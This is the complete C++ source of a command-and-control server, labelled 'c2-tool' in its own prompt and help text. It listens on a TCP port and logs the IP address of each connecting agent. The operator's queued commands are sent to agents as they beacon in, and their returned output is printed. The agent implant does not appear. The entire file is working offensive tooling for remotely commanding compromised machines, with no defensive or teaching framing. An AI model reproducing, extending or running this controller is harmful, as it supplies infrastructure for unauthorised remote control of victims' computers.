#include <csignal>
#include <cstdint>
#include <iostream>
#include <string>
#include <cstring>
#include <mutex>
#include <queue>
#include <thread>
#include <chrono>
#include <memory>
#include <atomic>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <unordered_set>
#include <cstdio>
#include "utils.h"

using namespace std;

struct ServerState {
    int sockfd = -1;
    atomic<bool> running = true;
    queue<string> commands{};
    unordered_set<string> seenIPs;
    mutex deadlock;
    vector<string> history;
};

ServerState server;


void closeSocket(int sig)
{
    server.running = false;
    close(server.sockfd);
}

int server_setup(int port)
{
    int listenfd = socket(AF_INET, SOCK_STREAM, 0);

    if (listenfd == -1)
    {
        cout << "\nSocket creation failed." << endl;
        return -1;
    }

    // in case server crashes -- freeing up socket
    int opt = 1;
    setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(port);
    socklen_t len = sizeof(serverAddr);

    int bnd = bind(listenfd, reinterpret_cast<sockaddr*>(&serverAddr), len);

    if (bnd == -1)
    {
        cout << "\nIssue Binding. Port in Use?" << endl;
        close(listenfd);
        return -1;
    }

    int lst = listen(listenfd, 3);

    if (lst == -1)
    {
        cout << "\n[server] Issue Establishing Listener." << endl;
        close(listenfd);
        return -1;
    }

    cout << "[server] listening on " << port << endl;

    return listenfd;
}

void main_handler(atomic<bool>& running, int port)
{
    while (running)
    {
        string command{};
        cout << "[c2-tool] > " << flush;
        getline(cin, command);
        if (command == "help")
        {
            cout << endl;
            cout << "This is a C2 Server. Issue commands to binded agents." << endl;
            cout << "'status' to check previously connected agents and running." << endl;
            cout << "'history' to check previously connected agents and running." << endl;
            cout << "Type 'help' to display this menu." << endl;
            cout << "'exit' to close the program." << endl;
            cout << endl;
        }
        else if (command == "status")
        {
            cout << endl;
            cout << "Server Running on Port: " << port << endl;
            cout << "Previously Connected Agents are: " << endl;
            {
                lock_guard<mutex> guard(server.deadlock);
                for (const auto& element : server.seenIPs)
                {
                    cout << element << endl;
                }
            }
            cout << endl;
        }
        else if (command == "history")
        {
            cout << endl;
            cout << "History of Commands Sent: " << endl;
            {
                lock_guard<mutex> guard(server.deadlock);
                for (const auto& element : server.history)
                {
                    cout << element << endl;
                }
            }
            cout << endl;
        }
        else if (command == "exit")
        {
            cout << "Exiting." << endl;
            running = false;
        }
        else
        {
            // this is all other commands -- presumably meant for agent
            {
                lock_guard<mutex> guard(server.deadlock);
                server.commands.push(command);
                server.history.push_back(command);
            }
        }
    }
}

int connection_handler(int fd, atomic<bool>& running)
{
    sockaddr_in clientAddr;
    socklen_t len = sizeof(clientAddr);

    while (running)
    {   
        string cmd{};
        string output{};
        bool isNewIP = false;

        int connfd = accept(fd, reinterpret_cast<sockaddr*>(&clientAddr), &len);
        
        if (connfd == -1)
        {
            cout << "\n[server] Connection Error. Trying Again." << endl;
            this_thread::sleep_for(chrono::seconds(2));
            continue;
        }

        char ipStr[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientAddr.sin_addr, ipStr, INET_ADDRSTRLEN);

        {
            lock_guard<mutex> guard(server.deadlock);
            if (server.seenIPs.find(ipStr) == server.seenIPs.end())
            {
                isNewIP = true;
                server.seenIPs.insert(ipStr);
            }
        }

        if (isNewIP)
        {
            cout << "\n[server] New Connection From: " << ipStr << endl;
        }
        
        {
            lock_guard<mutex> guard(server.deadlock);
            if (!server.commands.empty())
            {
                cmd = server.commands.front();
                server.commands.pop();
            }
        }

        if (!cmd.empty())
        {
            send_all(connfd, cmd);
        }
        else
        {
            send_all(connfd, "NOP");
        }

        output = recv_all(connfd); // receiving any command output

        if (output.empty())
        {
            cout << "\n[server] Empty String." << endl; // possible error
            close(connfd);
            continue;
        }
        else
        {
            cout << "\r" << output << "\n[c2-tool] > " << flush;
            close(connfd);
        }
    }

    return 0;
}


int main()
{
    int port = 6666;
    server.sockfd = server_setup(6666);

    if (server.sockfd == -1)
    {
        cout << "\nServer setup failed. Exiting." << endl;
        return 1;
    }

    signal(SIGINT, closeSocket);
    signal(SIGTERM, closeSocket);

    thread connectionThread(connection_handler, server.sockfd, ref(server.running));
    thread mainThread(main_handler, ref(server.running), port);

    // wait here
    connectionThread.join();
    mainThread.join();
}